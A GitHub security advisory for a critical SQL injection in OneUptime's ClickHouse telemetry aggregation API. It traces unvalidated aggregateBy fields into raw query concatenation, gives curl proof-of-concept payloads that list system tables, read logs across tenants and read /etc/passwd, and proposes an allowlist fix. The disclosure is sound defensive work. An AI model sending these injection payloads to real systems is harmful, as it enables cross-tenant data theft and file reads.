# [C]  OneUptime ClickHouse SQL Injection via Aggregate Query Parameters

## Summary
Severity: Critical
Advisory: GHSA-p5g2-jm85-8g35
CVE: CVE-2026-32306
CWE: CWE-89
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-13
Source: https://github.com/advisories/GHSA-p5g2-jm85-8g35
Type: github-advisory

## Affected
- npm: `oneuptime` — affected >=0 <10.0.23

## Details
### Summary

The telemetry aggregation API accepts user-controlled `aggregationType`, `aggregateColumnName`, and `aggregationTimestampColumnName` parameters and interpolates them directly into ClickHouse SQL queries via the `.append()` method (documented as "trusted SQL"). There is no allowlist, no parameterized query binding, and no input validation. An authenticated user can inject arbitrary SQL into ClickHouse, enabling full database read (including telemetry data from all tenants), data modification, and potential remote code execution via ClickHouse table functions.

### Details

**Entry Point — `Common/Server/API/BaseAnalyticsAPI.ts:88-98, 292-296`:**

The `POST /{modelName}/aggregate` route deserializes `aggregateBy` directly from the request body:

```typescript
// BaseAnalyticsAPI.ts:292-296
const aggregateBy: AggregateBy<TBaseModel> = JSONFunctions.deserialize(
    req.body["aggregateBy"]
) as AggregateBy<TBaseModel>;
```

No schema validation is applied to `aggregateBy`. The object flows directly to the database service.

**No Validation — `Common/Server/Services/AnalyticsDatabaseService.ts:276-278`:**

```typescript
// AnalyticsDatabaseService.ts:276-278
if (aggregateBy.aggregationType) {
    // Only truthiness check — no allowlist
}
```

The `aggregationType` field is only checked for existence, never validated against an allowed set of values (e.g., `AVG`, `SUM`, `COUNT`).

**Raw SQL Injection — `Common/Server/Utils/AnalyticsDatabase/StatementGenerator.ts:527`:**

```typescript
// StatementGenerator.ts:527
statement.append(
    `${aggregationType}(${aggregateColumnName}) as aggregationResult`
);
```

The `.append()` method on `Statement` (at `Statement.ts:149-151`) is documented as accepting **trusted SQL** and performs raw string concatenation:

```typescript
// Statement.ts:149-151
public append(text: string): Statement {
    this.query += text; // Raw concatenation — "trusted SQL"
    return this;
}
```

Similarly, `aggregationTimestampColumnName` is injected into GROUP BY clauses at `AnalyticsDatabaseService.ts:604-606`:

```typescript
statement.append(
    `toStartOfInterval(${aggregationTimestampColumnName}, ...)`
);
```

**Attack flow:**
1. Authenticated user sends `POST /api/log/aggregate` (or `/api/span/aggregate`, `/api/metric/aggregate`)
2. Request body contains `aggregateBy.aggregationType` set to a SQL injection payload
3. Payload passes truthiness check at line 276
4. Payload is concatenated into SQL via `.append()` at line 527
5. ClickHouse executes the injected SQL

### PoC

```bash
# Step 1: Authenticate and get session token
TOKEN=$(curl -s -X POST 'https://TARGET/identity/login' \
  -H 'Content-Type: application/json' \
  -d '{"email":"user@example.com","password":"password123"}' \
  | jq -r '.token')

# Step 2: Extract data from ClickHouse system tables via UNION injection
curl -s -X POST 'https://TARGET/api/log/aggregate' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -H 'tenantid: PROJECT_ID' \
  -d '{
    "aggregateBy": {
      "aggregationType": "COUNT) as aggregationResult FROM system.one UNION ALL SELECT name FROM system.tables WHERE database = '\''oneuptime'\'' --",
      "aggregateColumnName": "serviceId",
      "aggregationTimestampColumnName": "createdAt"
    },
    "query": {}
  }'

# Step 3: Read telemetry data across all tenants
curl -s -X POST 'https://TARGET/api/log/aggregate' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -H 'tenantid: PROJECT_ID' \
  -d '{
    "aggregateBy": {
      "aggregationType": "COUNT) as aggregationResult FROM system.one UNION ALL SELECT body FROM Log LIMIT 100 --",
      "aggregateColumnName": "serviceId",
      "aggregationTimestampColumnName": "createdAt"
    },
    "query": {}
  }'

# Step 4: Read files via ClickHouse table functions (if enabled)
curl -s -X POST 'https://TARGET/api/log/aggregate' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -H 'tenantid: PROJECT_ID' \
  -d '{
    "aggregateBy": {
      "aggregationType": "COUNT) as aggregationResult FROM system.one UNION ALL SELECT * FROM file('\''/etc/passwd'\'') --",
      "aggregateColumnName": "serviceId",
      "aggregationTimestampColumnName": "createdAt"
    },
    "query": {}
  }'
```

```bash
# Verify the vulnerability in source code:

# 1. No allowlist for aggregationType:
grep -n 'aggregationType' Common/Server/Services/AnalyticsDatabaseService.ts | head -5
# Line 276: if (aggregateBy.aggregationType) { — truthiness only

# 2. Raw SQL concatenation:
grep -n 'aggregationType.*aggregateColumnName' Common/Server/Utils/AnalyticsDatabase/StatementGenerator.ts
# Line 527: `${aggregationType}(${aggregateColumnName}) as aggregationResult`

# 3. .append() is raw concatenation:
grep -A3 'public append' Common/Server/Utils/AnalyticsDatabase/Statement.ts
# this.query += text; — "trusted SQL"

# 4. No validation at API layer:
grep -A5 'aggregateBy' Common/Server/API/BaseAnalyticsAPI.ts | grep -c 'validate\|sanitize\|allowlist'
# 0
```

### Impact

**Full ClickHouse database compromise.** An authenticated user (any role) can:

1. **Cross-tenant data theft** — Read telemetry data (logs, traces, metrics, exceptions) from ALL tenants/projects in the ClickHouse database, not just their own
2. **Data manipulation** — INSERT/ALTER/DROP tables in ClickHouse, destroying telemetry data for all users
3. **Server-side file read** — Via ClickHouse's `file()` table function (if not explicitly disabled), read arbitrary files from the ClickHouse container filesystem
4. **Remote code execution** — Via ClickHouse's `url()` table function, make HTTP requests from the server (SSRF), or via `executable()` table function, execute OS commands
5. **Credential theft** — ClickHouse default configuration (`default` user, password from env) could be leveraged to connect directly

The vulnerability requires only basic authentication (any registered user), making it exploitable at scale.

### Proposed Fix

```typescript
// 1. Add an allowlist for aggregationType in AnalyticsDatabaseService.ts:
const ALLOWED_AGGREGATION_TYPES = ['AVG', 'SUM', 'COUNT', 'MIN', 'MAX', 'UNIQ'];

if (!ALLOWED_AGGREGATION_TYPES.includes(aggregateBy.aggregationType.toUpperCase())) {
    throw new BadRequestException(
        `Invalid aggregationType: ${aggregateBy.aggregationType}. ` +
        `Allowed: ${ALLOWED_AGGREGATION_TYPES.join(', ')}`
    );
}

// 2. Validate aggregateColumnName against the model's known columns:
const modelColumns = model.getColumnNames(); // or similar accessor
if (!modelColumns.includes(aggregateBy.aggregateColumnName)) {
    throw new BadRequestException(
        `Invalid column: ${aggregateBy.aggregateColumnName}`
    );
}

// 3. Same for aggregationTimestampColumnName:
if (aggregateBy.aggregationTimestampColumnName &&
    !modelColumns.includes(aggregateBy.aggregationTimestampColumnName)) {
    throw new BadRequestException(
        `Invalid timestamp column: ${aggregateBy.aggregationTimestampColumnName}`
    );
}

// 4. Use parameterized queries where possible:
statement.append(`{aggregationType:Identifier}({columnName:Identifier}) as aggregationResult`);
statement.addParameter('aggregationType', aggregateBy.aggregationType);
statement.addParameter('columnName', aggregateBy.aggregateColumnName);
```

## References
- https://github.com/OneUptime/oneuptime/security/advisories/GHSA-p5g2-jm85-8g35
- https://nvd.nist.gov/vuln/detail/CVE-2026-32306
- https://github.com/OneUptime/oneuptime
- https://github.com/OneUptime/oneuptime/releases/tag/10.0.23
